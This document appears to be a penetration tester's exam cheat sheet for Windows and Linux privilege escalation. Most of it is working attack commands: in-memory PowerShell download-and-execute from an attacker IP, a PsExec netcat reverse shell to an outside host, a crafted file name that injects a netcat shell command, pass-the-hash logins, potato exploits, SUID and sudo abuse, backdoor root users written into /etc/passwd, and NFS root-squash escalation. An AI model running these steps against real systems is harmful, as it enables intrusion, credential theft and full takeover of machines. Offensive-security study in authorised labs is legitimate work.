            > ~/notes/exam/binaries/Windows/_enumeration/windows-exploit-suggester.py -u
        - on windows system show systeminfo and copy to linux machine as a .txt
            > systeminfo
            - copy all of screen output to a file on kali (Example "sysinfo.txt")
        - run windows-exploit-suggester 
            > ~/notes/exam/binaries/Windows/_enumeration/windows-exploit-suggester.py -d 2020-04-06-mssb.xls --systeminfo sysinfo.txt
    - winPEAS
        - run the following regkey to windows cmd to enable colors
            > reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
        > winpeas.exe > winpeas.out
        - transfer back to kali and run the following to view it
            > less -f -r winpeas.out
                    - Services (search for)
            > cat winpeas.out
    - windows-privesc-check
        > certutil.exe -urlcache -split -f http://192.168.19.21/windows-privesc-check2.exe C:\Users\xavier\Downloads\windows-privesc-check2.exe
        > windows-privesc-check2.exe --audit -a -o wpc-report 
    - Watson
        - Check .NET framework version (highest value listed)
            > reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
        - Check architecture (If ProgramFilesX86 appears its 64 bit)
            - see above for how to look this up
        - Determine if this is Windows 7 or older for verison to compile
        - Open visual studio with .slv watson version
        - Project > Watson Properites > set .NET framework version
        - Build > watson > Configuration Manager
            - Set to release, then x86 (make <new> and copy All CPU)
        - Build > Build Watson
        - Uploadd run on system
    - SharpHound.ps1 (For AD enumeration)
        > . .\SharpHound.ps1
        > Invoke-BloodHound -CollectionMethod All
        > transfer the .bin and .zip file back to Kali
    - Use PowerUp.ps1
        - 64bit via powershell
            > powershell -exec bypass
            > . .\PowerUp.ps1
            > Invoke-AllChecks
        - 64bit via cmd
            > C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -c "iex(new-object net.webclient).downloadstring('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks
    - Use Sharpup.exe (precompiled PowerUp)
        > Sharpup.exe
    - Seatbelt.exe (Data gathering)
        > SeatBelt.exe All > seatbelt.out
        - Search for nonstandard processes
            > Seatbelt.exe NonstandardProcesses
    - jaws
        - output to screen 
            > powershell.exe -executionpolicy bypass -file .\jaws-enum.ps1
        - output to file
            > powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.out

## Windows PE
    - Missconfigured services
        - service level permissions (Change path of service to a different executable)
            - Service levels
                - Useful:
                    - SERVICE_STOP
                    - SERVICE_START
                - Dangerous
                    - SERVICE_CHANGE_CONFIG
                    - SERVICE_ALL_ACCESS 
            - Find a service that has high permissions, can be configured, and can be started / stopped
                - Perform a winpeas scan and search for 
                    > winpeas.exe servicesinfo > winpeas.out
                    - Search for the following, these services maybe crucial to adjust!
                        - "Services Information"
                        - "Modifiable Services"
                - verify
                    - Check the service
                        - .\accesschk.exe /accepteula -uwcqv user daclsvc
                            - Look for "SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP"
                            - Check if there are depenencies and if they need to start.
                    - Check configuration
                        - sc qc daclsvc
                            - Look for "SERVICE_START_NAME : Local System" = System user 
                - Once all of this is checked, change the location of "BINARY_PATH_NAME"
                    > sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
                    - Check change
                        > sc qc daclsvc 
                - Start service
                    > net start daclsvc
        - Unquoted service path
            - Example: --> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
                - Windows will check "C:\Program" first, so create a binary located in "C:\" name "Program"
            > winpeas.exe servicesinfo > winpeas.out
                - Search for the following in winpeas file
                    - "Services Information"
                    - "No\ quotes\ and\ Space\ detected"
                    OR
                    - "Unquoted and space detected"
            - verify
                - Check if you can start or stop the service
                    - .\accesschk.exe /accepteula -ucqv user unquotedsvc
                            - Look for "SERVICE_START, SERVICE_STOP"
                - Check service current state
                    > sc qc unquotedsvc
                        - Look for "SERVICE_START_NAME : Local System" = System user 
                - Check if you have write permissions for each directory in the path
                    - Perform "gpresult /V" to determine which security groups you are apart of.
                    > .\accesschk.exe /accepteula -uwdq C:\
                    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
                    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
                        - In this dir "Common" = "common.exe"
            - Add a reverse shell service to the path with the specific name
            - Start service
                > net start unquotedsvc
        - Weak registry permissions
            > winpeas.exe servicesinfo > winpeas.out
                - Search for the following in winpeas file
                    - "Services Information"
                    - "modify\ any"
                    - make sure it says "(Interactive [TakeOwnership])"
            - verify
                - accesschk
                    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
                - Powershell
                    > powershell -c "Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List"
                - Look for "RW NT AUTHORITY\INTERACTIVE KEY_ALL_ACCESS"
                - Make sure you can start the service
                    > .\accesschk.exe /accepteula -ucqv user regsvc
                        - Look for "SERVICE_START"
                - Check current values in reg entry
                    > reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
                        - Look at "ImagePath" <-- location of binary
                        - Look at "Object Name" <-- priv reg svc will run as 
            - Change path of binary
                > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse2.exe /f
            - Start registry service
                > net start regsvc
        - Insecure Service Executables (Change file that a service points to)
            > winpeas.exe servicesinfo > winpeas.out
            - Search for the following in winpeas file
                - "Services Information"
                - Search "Everyone" 
                - Make sure it reads "File Permissions: Everyone [AllAccess]"
            - verify
                - Check permissions 
                    > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
                        - Must have RW Everyone, RW BUILTIN\USERS, or RW <YOUR USERNAME>, but it also must have NT AUTHORITY\SYSTEM and/or BUILTIN\Administrators
                - Check if you can start and stop service
                    > .\accesschk.exe /accepteula -ucqv user filepermsvc
                        - Look for "SERVICE_START"
            - Backup service executable, and copy over reverse shell
                - copy "C:\Program Files\File Permissions Service\filepermservice.exe" ".\filepermservice.exe.backup"
                - copy /Y C:\PrivEsc\reverse2.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
            - Start service executable
                > net start filepermsvc
        - DLL Hijacking
            - Search for the following in winpeas file
                - "Services Information"
                - Search "DLL"
                - Make sure a "DLL Hijacking" folder location is writable and in the windows PATH
                - Looking for a DLL that is loaded by an executable that has high enough permissions. 
                    - If the DLL is writable, we can replace it with a reverse shell
                    - If the DLL is missing, we can substitute its location with a reverse shell
            - Need to look at all "non-Microsoft" services under "Service Information"
                - Determine which ones the user has all START and STOP access to.
                    > .\accesschk.exe /accepteula -ucqv user * | findstr /i /L /c:"R  " /c:"RW " /c:"W  " /c:"START" /c:"STOP"
            - Analyize: Need to copy the binary off the system and test on a test windows system (Same kernel, version, and patches)
                - Use Procmon64.exe to analyize its behavior
                    - Run as administrator
                    - Stop (magnifind glass) and clear (paper with eraser) current output 
                    - CTRL-L (Add filter)
                        - Change "Display enteris matching" to the dllname with extension "dllhijackservice.exe"
                        - Apply, and Ok
                    - Turn off registry and network activity buttons
                    - Start capture again
                    - Start the service
                        > net start dllsvc
                    - Look under "Result" for "NAME NOT FOUND", the associated "PATH" shows the file location and name
                    - LOOK for a path that is equal to the winpeas scan for DLL hijacking. 
            - Create a reverse shell for dll type (see msfvenom dll type)
            - Copy to specific file path for hijacking
            - Start service executable
                > net start dllsvc
    - AutoRuns
        - Search for the following in winpeas file (Can use "autorun" to scan only for it)
            - "Autorun\ Applications
            - Under here look for any application that has FilePerms "Everyone [AllAccess]"
        - verify
            - Query registery for auto run programs
                > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
            - Check all for permissions
                > .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
                    - Look for permissions for security groups you are in
        - Make a backup of the autorun file
        - Reboot the system with listener running.
    - AlwaysInstallElevated (MSI)
        - Search for the following in winpeas file (Can use "windowscreds" to scan only for it)
            - "AlwaysInstallElevated"
                - Search for "AlwaysInstalledElevated" for HKLM and HKCU
        - verify
            > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
                - Makesure REG_DWORD = 0x1
            > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
                - Makesure REG_DWORD = 0x1
        - Create new reverse shell for MSI (see msfvenom section)   
            - This alone will give you the nt system auth you need to priv esc
        - Run the shell
            > msiexec /quiet /qn /i reverse.msi
            - WARNING! This will create an error on windows desktop, if you need to reconnect, you must kill the Windows Installer process
                > tasklist | findstr -I msiexec.exe
                    - Find all PID values
                > Taskkill /PID 2928 /F
                OR
                > wmic process where name='msiexec.exe' delete
            - Once all killed, you can run reverse shell again
    - Passwords
        - Autologin or saved creds
            - Search for the following in winpeas file (Can use "filesinfo" and "userinfo" to scan only for it)
                - "AutoLogon"
                - "Putty"
            - verify
                > reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
                    - "DefaultUser" and "DefaultPassword" (at bottom)
                > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
            - Access from Kali
                - use winexe
            - Access from windows
                - Use PsExec64.exe 
        - Credential Manager
            - Search for the following in winpeas file (Can use "filesinfo" and "userinfo" to scan only for it)
                - "Credential"
            - verify (Note the actual password will not be listed but if the name shows up, it can be used)
                > cmdkey /list
            - Use the saved creds (In windows)
                > runas /savecred /user:admin C:\PrivEsc\reverse2.exe
        - Search for passwords (Run in current user directory, temp directories, or a suspecious program dir)
            - Recursively search for file in th current directory
                > dir /s *passw* == *.config
            - Recursively search for files in the current directory that contain "password" and end in extensions 
                > findstr /si password *.xml *.ini *.txt
            - C:\Windows\Panther\Unattend.xml usually has a password in base64
                > echo "cGFzc3dvcmQxMjM=" | base64 -d
    - Scheduled Tasks
        - List all tasks
            > schtasks /query /fo LIST /v
        - Check permissions on a script
            > .\accesschk.exe /accepteula -quv user "C:\Devtools\CLeanup.ps1"
        - Append to it
            > echo |set p=/"C:\PrivEsc\reverse2.exe" >> "C:\Devtools\CLeanup.ps1"
    - Admin from GUI
        - Find a symoblic links (Note this is difficult)
            > dir /AL /S C:\ 
               - look for any target "C:\Windows\System32\runas.exe0
        - for paint 
            - File > Open > "file://c:/windows/system32/cmd.exe"
    - Startup Apps
        - verify
            > .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        - Adjsut ~/notes/exam/binaries/Windows/CreateShortcut.vbs to location of reverse shell.exe
            > cscript CreateShortcut.vgs
        - wait for user to login. 

    - For w2k3
        - Use churrasco
            - perform a "whoami /priv" "SeImpersonatePrivilege" must be enabled
            > .\churrasco.exe "cmd.exe"
            > .\churrasco.exe "c:\windows\system32\cmd.exe"
        - Use MS11_46_k8.exe to create user: "k8team" with password: "k8team"
            > .\MS11_46_k8.exe
    - Site of precompiled windows exploits
        - https://github.com/SecWiki/windows-kernel-exploits
    - Create new logon session (need creds for user)
        > runas /user:domain\username cmd.exe
        > runas /user:domain\username /netonly cmd.exe
    - Potatoes!
        - HotPotato: (Will work on windows 7,8, and early version of 10)
            - -ip = current windows ip
            - -cmd = command to run
                > potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
        - JuicyPotato: (Patched on latest versions of Windows10)
            - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
            - Need to check version of Windows with "powershell -c Get-ComputerInfo -Property "WindowsVersion"", if its 1809 or higher, this will not work
            - Go to this site to gather a CLID to use http://ohpe.it/juicy-potato/CLSID/
                - You can also download the "GetCLSID.ps1" and "Join-Object.ps1" to the victim and gather the data with
                    > powershell .\GetCLSID.ps1
            - Check which ports are available to use (Used for -l)
                > netstat -ano
            - Create your reverse shell and listen and run the following command:
            > JuicyPotato.exe -l 5837 -p c:\inetpub\wwwroot\reverseshellpayload.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
            Windows Server 2008
            > JuicyPotato.exe -l 5837 -p c:\ColdFusion8\runtime\bin\rs_x64_win.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
        - RougePotato:
            - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
            - Check which ports are available to use with "netstat -ano" (Will be used for -l in RougePotato.exe)
            - ON KALI: Create a reverse shell with msfvenom, choose available port
            - ON KALI: set up a forwarder to 9999. Make sure "192.168.1.155" is the WINDOWS IP. If you port changes you must chnage in RoguePotato script
                > sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.155:9999
            - ON WINDOWS: run rogue potato, assign -l to port used in socat
                > RoguePotato.exe -r 192.168.1.156 -l 9999 -e "C:\PrivEsc\reverse.exe"
    - PrintSpoofer
        - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
        - Must have windows C++ installe
            - verify
                > wmic product get name
        > C:\PrivEsc\PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"
    - PsExec:ping 192.168.147.43

- PE to netcat as user
            > PsExec64.exe -accepteula -u alice -p aliceishere cmd /c "c:\Users\Public\nc.exe 192.168.119.135 80 -e cmd.exe"
        - PE to reverse shell   
            > PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
    - Download files with powershell:
        > powershell -c "(new-object System.Net.WebClient).DownloadFile('wget http://192.168.119.135/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
    - minireverse.ps1 with psexec
        > powershell.exe -c "$user='BUFF\Administrator'; $pass=''; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\Administrator\Desktop\root.txt } -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1
    - pass the hash (From from kali)
        - Example admin hash on windows 2012 --> "Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::"
        - psexec.py
            > psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
        -pth-winexe 
            > pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.135.10 cmd
    - Manually add user to admin group
        > net user /add cooldude password123
        > net localgroup administrators cooldude /add


# Linux PE Section
-------------------
*Linux PE Steps*
1) Run the following commands, figure out who you are with rights
    > whoami
    > id
    > groups
2) work from /dev/shm (usually world writable / readable)
3) run lse and linpeas at the same time to output files

cd /dev/shm
    - wget all the files
chmod +x lse.sh linpeas.sh LinEnum.sh suid3num.py
./lse.sh -l 1 -i 2>&1 > lse.out &
./linpeas.sh 2>&1 > linpeas.out &
./LinEnum.sh 2>&1 > LinEnum.out &
python ./suid3num.py 2>&1 > suid3num.out &
mkdir enum
`mv *.out ./enum
tar -zcvf enum.tar.gz ./enum

4) Check system info
    > hostname
    > uname -a
    > uname -m
    > cat /etc/*release
    > bash --version; sh --version 
    > export -p
5) run linux-exploit-suggester2
    > linux-exploit-suggester2.pl > l-ex-sugg.out
6) perform a quick look around the following
    > ls -las ~
    > ls -las /
    > ls -las /tmp
7) Make note of specific ports that are open and available to use!!!
    > netstat -tulpn 
    - If no netstat
        > grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
        OR
        > ss -aut
    - Freebsd
        > sockstat -4 -l
    - Use egressbuster.py
8) Try simple exploits first
    - Cron jobs, sudo, version of programs for exports 
9) Look for odd file systems (something gesides ex4)
10) If you still cant get escallation, reread through your entier enumeration
11) IF all else fails its time to look into kernel exploits from windows-exploit-suggester

************
## linux manual enumeration:

    - Linux terminal commands:
        - Information about user account being used
            - Your info
                - Effective id
                    > whoami
                - Print real and effective IDs
                    > id 
            - permissions
                > sudo -l
                    - Anything found can be run as you without a password if listed (sudo /script/found)
                - list all suid and guid binaries
                    > find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
                - setting the SUID bit
                    > chmod 6555 binary
            - Groups
                - List groups user is in
                    > groups
                - list all groups
                    > cat /etc/group
                - list all users in group
                    - upload "grouping" to system
                    - ./grouping <group>
                    - list all users in each group
                        > for i in $(cat /etc/group | awk -F ":" '{ print$1 }'); do ./grouping $i; done
                - list all users that have a different effective id
                    > for i in $(cat /etc/passwd | awk -F ":" '{print$1}'); do id $i; done | grep euid
        - Info about other users
            - show other users
                - cat /etc/passwd
                    - you can also column the output
                        > column /etc/passwd -t -s ":"
                - groups $user
        - IP info
            > ifconfig | more
            > ip a
        - Port info
            > netstat -tulpn
            > netstat -peanut
            > netstat -ln
            - If no netstat
                > grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
                OR
                > ss -aut
            - freebsd
                > socks -4 -l
        - Gather System info
            > hostname
            > uname -a
            > cat /etc/*release
            - Freebsd
                - freebsd-version
                - uname -mrs
        - Check bash version (Look for version < 4.2-048)
            > sh --version
            > csh --version
            > bash --version
            > zsh --version
        - Check architecture
            > uname -m        
        - Find readable and writable directories for user or group
            - find / -user <user> 2>/dev/null
            - find / -group <group> 2>/dev/null
        - Writeable locations
            > find / -type d -writable 2>/dev/null
            > find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
        - Writeable files
            > find -type f -writable -ls
            - In current directory
                > find . -writable
            - Check if there any python binaries you can write to
        - list directories then files
            > ls -la | grep "^d" && ls -la | grep -v "^d"
        - systemd
            - list all systemd running services
                > systemctl list-units --type=service --no-pager
                > systemctl list-units --type=service --state=active --no-pager
            - List all timesr
                > systemctl list-timers --no-pager
                > watch systemctl list-timers --no-pager
            - systemctl status <unit> --no-pager
            - Check for weak file permissions of /bin/systectl
                - You can create a service (Use "revshell.service" in exam/binaries)
                - start service
        - Check crontab
            - This site tells time --> https://crontab.guru/
            - Find all cron jobs
                > cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs /var/spool/anacron /etc/incron.d/* /var/spool/incron/* 2>/dev/null
            - LOOK FOR "/etc/cron.d/ jobs
            - Directories
                - /var/spool/cron/
                - /var/spool/cron/crontabs/
                - /etc/crontab/

                Example of cron job definition:
                .---------------- minute (0 - 59)
                |  .------------- hour (0 - 23)
                |  |  .---------- day of month (1 - 31)
                |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
                |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
                |  |  |  |  |
                *  *  *  *  * user-name  command to be executed

        - Check installed packages
            - On debian (search for all packages with)
                > dpkg -l | grep <program>
            - on centos / rhel / fedora 
                > rpm -qa | grep <program>
            - freebsd
                > pkg info


## linux auto enumeration:
    - New way to read these files!
        > vgm
        - ESC, then type :terminal
        > cat winpeas.out
        - Go back to normal mode Ctrl-w N
        - Close the original vim layout, Ctrl-w w
        - ESC, then type :q

    - linPEAS
        > ./linpeas.sh 2>&1 > linpeas.out &
        - transfer back to kali and run the following to view it
            > less -f -r linpeas.out
            > cat linpeas.out
    - linux-smart-enumeration
        > ./lse.sh 2>&1 > lse.out &
        - transfer back to kali and run the following to view it
            > less -f -r lse.out
            > cat lse.out
        - If all else fails use
            > ./lse.sh -l 1 -i
    - linux package vulns
        - run the following oneliner
            > FILE="packages.txt"; FILEPATH="/tmp/$FILE"; /usr/bin/rpm -q -f /usr/bin/rpm >/dev/null 2>&1; if [ $? -eq 0 ]; then rpm -qa --qf "%{NAME} %{VERSION}\n" | sort -u > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; else dpkg -l | grep ii | awk '{print $2 " " substr($3,1)}' > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; fi; echo ""; echo "[>] Done. Transfer $FILEPATH to your computer and run: "; echo ""; echo "./packages_compare.sh /dev/shm/$FILE"; echo "";
        - Copy the file it generates (/tmp/package.txt) back to your machine (or any machine with searchsploit)
        - Run this script, passing in the filepath:
            > ~/notes/exam/binaries/Linux/_enumeration/vuln_pkg_lookup.sh ./packages.txt > ./packages.txt.found
        - compare
            > vimdiff ./packages.txt ./packages.txt.found
            > :diffoff!
    - Monitor events with "pspy"
        - uplaod to linux host
        > pspy32 
        - watch output
    - suid lookup
        > python ./suid3num.py
    - reverse shell generator (REQUIRES PYTHON3!!)
        > rsg 192.168.1.156 4444
        OR
        > rsg 192.168.1.156 4444 [TYPE]

### Linux PE
    - Taking advantage of a SUID binary
        - run suid3num.py
        - anything under "hell yeah" do the following
            > TF=$(mktemp)
            > echo 'os.execute("/bin/sh")' > $TF
            > /usr/bin/nmap localhost --script=$TF
    - rootshell (Must have some sudo priv, check "sudo -l")
        > cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
        > /tmp/rootbash -p
        OR 
        create a script
            > echo "#!/bin/bash" > givemeroot.sh
            > echo "cp /bin/bash /tmp/rootbash" > givemeroot.sh
            > echo "chmod +s /tmp/rootbash" > givemeroot.sh
            > chmod +x givemeroot.sh
    - custom executable
        - Upload "spawn-shell.c" and compile
        - must use other process to run the binary to spawn a shell
    - Kenel exploit searchsploit criteria example
        > searchsploit linux kernel 2.6.32 priv esc
        - for linux kernel expoits check this site too (all are very old)
            > https://github.com/lucyoa/kernel-exploits
        - Need to make sure you check sources OUTSIDE of exploitdb
    - service exploits
        > ./lse.sh
        - Search for the following in lse file
            - search for "processes"
        - verify
            - Check which processes are running as root
                > ps aux | grep "^root"
                - freeBSD
                    > ps auwwx | grep "^root"
            - Check versions running
                > mysqld --version
    - Weak folder permissions
        - world writeable / executable means other files can be created inside
            - example: "rwxrwxrwx 2 root root 4096 Mar  5 08:29 backup"
            > find / -type d -perm -777 2>/dev/null
    - Weak file permissions
        - Shadow file
            - Check if you can read shadow files
                > ls -l /etc/shadow
                    - make sure "world readable" is enabled
                > freebsd
                    > ls -l /etc/master.passwd
            - Crack shadow hash (see hash cracking for linux section)
        - Create a user
            - edit /etc/passwd, to add your own user with openssl for the password
        - Add user to sudoers file
            - echo the following into the sudoers file
                > echo "username ALL=(ALL) ALL >> /etc/sudoers"
        - Writable files
            - search lse.out for "Writable"
            - verify 
                > ls -l <file name> 
                    - make sure "world writable" is enabled
                - copy all paths to file
                    > for i in $(cat checkfiles.txt); do ls -l $i;done
        - Password files
            - Good info on shadow file
                - https://www.cyberciti.biz/faq/understanding-etcshadow-file/
            - Create a user in /etc/passwd (/etc/passwd must be writable via suid bit)
                - Create hash password
                    > openssl passwd evil
                > echo "evil:HFLcYzgutvecY:0:0:root:/root:/bin/bash" >> /etc/passwd
                - Also try to just delete the "x" for the password field, could possible login with no password
                - NOTE!!! You can use wget (if the suid bit is set) and copy your own passwd file to the system
            - Edit the root user's password  in /etc/shadow (/etc/shadow must be writable)
                - make backup of /etc/shadow
                - Create hash password
                    > mkpasswd -m sha-512 evil
                - Edit the root users hash ( between first and second ":") with new hash
        - Backups
            - search for odd locations for backups ( "/" "~") 
            - search for hidden directories
        - Python libraries
            - Make sure to check paths the current python system uses
                > python -c 'import sys; print "\n".join(sys.path)'
                > python3 -c 'import sys; print("\n".join(sys.path))'
                    - Are any writable for you to use?
                    - edit the imported script in the location
                    - REMEMBER, the current directory the script is running from is the first path, it will not be shown in the output
                - You can force set a path with this
                    > PYTHONPATH=/home/walter
        - Check for non-sanitized data in scripts
            - example php can uses "exec()" if variables are used inside, you can change file names
                > touch '; nc 10.10.14.28 4445 -c bash'

    - sudo 
        - run as a specific user
            > sudo -u $user <program>
            > sudo -s
            > sudo -i
            > sudo /bin/bash
            > sudo passwd
        - Escape shell:
            - take advantage of sudo -l
                - find programs that can run sudo without password
                    > sudo -l
                - go to gtfobins website and look up command to escape 
                - NOTE!!
                    > must include "-u $user" on the sudo commands
            - Escape rbash
                > echo $PATH
                > export -p
                - From vim
                    :! /bin/bash
                    :shell
                > declare -x SHELL="/bin/bash"
                > declare -x PATH="/home/USERNAME:/sbin:/usr/local/sbin:/usr/sbin:/usr/local/bin:/usr/bin:/bin"
                - or change shell with chsh
                    > chsh -s /bin/bash $USER
        - Abuse intended functionality
            - apache2
                > sudo apache2 -f /etc/shadow
                    - Crack the hash output
        - Environment variables
            - LD_PRELOAD
                > sudo -l 
                    - Make sure anything that is available for yourself to use
                        - "www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*"
                            - this means "www-data" can
                                - Execute from ALL terminals
                                - As it's self with no Password
                                - to only run /usr/bin/vi on any file in /var/www/html (or the dir itself)
                        - Use gtfobins to find out how to exploit 
                    - Look for "Matching defaults", these are settings applied to /etc/sudoers
                        - evn_reset
                        - env_keep+=LD_RELOAD
                    - Real user id must be the same as effective user id!!
                - upload preload.c file
                - compile
                    > gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
                - PE
                    > sudo LD_PRELOAD=/tmp/preload.so find
            - LD_LIBRARY_PATH
                > sudo -l
                    - Look for 
                        - env_keep+=LD_LIBRARY_PATH
                - find shared objects of any listed sudo program in sudo -l
                    > ldd /usr/sbin/apache2
                        - Example: "libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f36fc9dd000)"
                        > sudo -l
                        - find a sudo application listed
                        > which <application>
                        > ldd <application full path>
                        - pick a shared object
                        - upload library_path.c
                        > gcc -o <shared library name> -shared -fPIC library_path.c
                        > sudo LD_LIBRARY_PATH=. <application>
    - Cron jobs
        - Writable cron jobs
            - search lse.out for "cron"
            - verify
                - cat /etc/conrtab shows contents
        - Write to paths present in cron jobs
            - search lse.out for "Can we write to executable paths present in cron jobs"
            - verify
                - cat the cron jobs listed in "Cron jobs" of lse
                - determine which part of the path is searched first
                    - look for cron jobs that are non absolute paths
                - Create a script for reverse shell in said path
        - Wildcards
            - search lse.out for "Can we write to executable paths present in cron jobs"
            - verify
                - cat the cron jobs listed in "Cron jobs" of lse
                - check any scripts that will run
                    - Inside the script look for any applications that use wildcards (e.g "*")
                    - Determine the location the script will run
                - Lookup how to escape the application with gtfobins
                    - create any command line arguments as files with touch
                        - Example: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                            > touch --checkpoint=1
                            > touch --checkpoint-action=exec=reverseshell.esp
                            - create reverseshell.esp with msfvenom and add to directory
    - SUID / SGID executables
        - search lse.out for "Uncommon setuid" or "Uncommon setgid"
        - verify
            > find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
                - Most of these are not exploitable
            - ls -l the uncommon binaries
        - Run binaries to see what they do then use strace to find out if depenecies are missing
            > strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
                - find any files trying to be run that are in a writable path and missing
            - transfer over "~/suid/spawn_from_depend.c"
            - compile
            - move .so file to location
        - Adjust local path to search for binaries / files being called in SUID binary
            - example (look up nullbyte pe)
                1) /var/www/backup was world writable
                2) -rwsr-xr-x 1 root   root   4932 Aug  2  2015 procwatch
                3) this runs the command "ps" which we can tell from pspy32
                4) create a symbolic link to run "ps" -> /bin/sh
                5) Update your path to include the current directory, in the front of all the rest of your path
                6) run procwatch --> runs ps --> ps is searched for in local dir first --> local dir "ps" is found --> it is run, which actually runs /bin/sh
                7) root
        - Exploit path variable
            - non absolute path being called
                - determine what appliction tries to run the program (strings will show what strings can be found from a binary)
                    > strings ./file
                        - If you can determine what is running the application make sure there is no aboslute path!
                - use strace with grep on the starting application (service, systemctl, init, supervisor, etc.)
                > strace -v -f -e execve /path/to/binary 2>&1 | grep service
                    - since "serivce binary start" does not have an absolute path, a new program can be created and append to the path variable
                - upload "spawn_from_service.c" and compile
                    > gcc -o service spawn_from_service.c
                        - Note must be named "service" or the starting application binary name
                - append to path to exploit 
                    > PATH=.:$PATH /usr/local/bin/suid-env
                    - Add to your ~/.bashrc
                        > export PATH=$PATH:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin
            - Abuse shell
                - Function abuse (bash < 4.2.048)
                    - Absolute path being called + bash > 4.2.048
                        - Perform same strace as above
                    - Exploit by building function exporting and running the service
                        > function /usr/sbin/service { /bin/bash -p; }
                        > export -f /usr/sbin/service
                        > /usr/local/bin/suid-env2
                - SHELLOPTS (bash < 4.4)
                    - Test if xtrace PS4 envar is run as root   
                        > env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env2
                            - should say "root" for each value run
                    > env -i SHELLOPTS=xtrace PS4='$(/bin/bash -p)' /usr/local/bin/suid-env2
    - passwords
        - history files
            > cat *.history
        - config files
            - search for config files, passwords maybe store in plain text
        - SSH keys
            - search for ssh keys then use for ssh as the identity
    - NFS
        - in lse.out seasrch for "NFS"
            - verify
                > showmount -e 192.168.1.159
                > cat /etc/exports
        - rootsquash
            - disable root squash
                - edit /etc/exports if possible and apply "no_root_squash"
                    > echo "/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)" > /etc/exports
            - create msfvenom 
                > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
            - mount share and create a rootbash file with +xs (must create IN directory)
                > mkdir mnt/
                > sudo mount -o rw,vers=2 192.168.1.159:/tmp mnt/
                > msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf shell.elf
                > chmod +xs /tmp/nfs/shell.elf
            - Back in your regular user
                > /tmp/shell.elf -p

# Check if victim can communicate with you
------------------------------------------
